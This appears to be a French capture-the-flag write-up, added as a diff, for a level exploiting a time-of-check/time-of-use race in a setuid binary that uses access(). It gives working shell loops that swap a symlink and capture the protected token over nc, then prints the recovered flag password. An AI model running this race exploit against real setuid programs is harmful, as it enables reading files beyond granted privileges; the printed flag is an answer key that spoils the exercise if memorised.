@@ -1,0 +1,50 @@
+ls -l montre que 'token' appartient a flag10 et l'executable 'level10' appartient a flag10 et contient un setuid.
+
+A l'execution, on a le message suivant:
+sends file to host if you have access to it.
+
+./level10 token 127.0.0.1
+You don't have access to token
+
+grace a la commande "strings level10", on voit que l'executable se connecte au port 6969.
+On remarque egalement l'utilisation d'access.
+D'apres son man, access contient une faille de securite importante:
+"the user might exploit the short time interval
+between checking and opening the file to manipulate it"
+
+Nous allons exploiter cette faille. Ensuite il restera juste a le recevoir avec nc sur le port 6969.
+
+On commence par creer 1 fichier vide:
+touch /tmp/tmp
+
+Puis nous allons faire tourner 3 boucles en parallele:
+
+La premiere cree un lien symbolique /tmp/token de ~/token, puis le change en lien symbolique de /tmp/tmp sur lequel nous avons les droits.
+
+La deuxieme boucle lance le binaire avec notre lien symbolique en parametre.
+
+La derniere recupere le contenu avec nc pour l'ecrire dans /tmp/received.
+
+(for i in `seq 1 3000`;
+do
+	ln -fs ~/token /tmp/token;
+	ln -fs /tmp/tmp /tmp/token;
+done;)&
+
+(for i in `seq 1 3000`;
+do
+	~/level10 /tmp/token 127.0.0.1 &> /dev/null;
+done;)&
+
+for i in `seq 1 300`;
+do
+	nc -l 6969 >> /tmp/received;
+done;
+
+
+Il ne reste plus qu'a afficher le mot de passe contenu dans /tmp/received:
+
+cat /tmp/received | grep -v '.*( )*.' | tail -n 1
+
+Mot de passe de flag10:
+woupa2yuojeeaaed06riuj63c
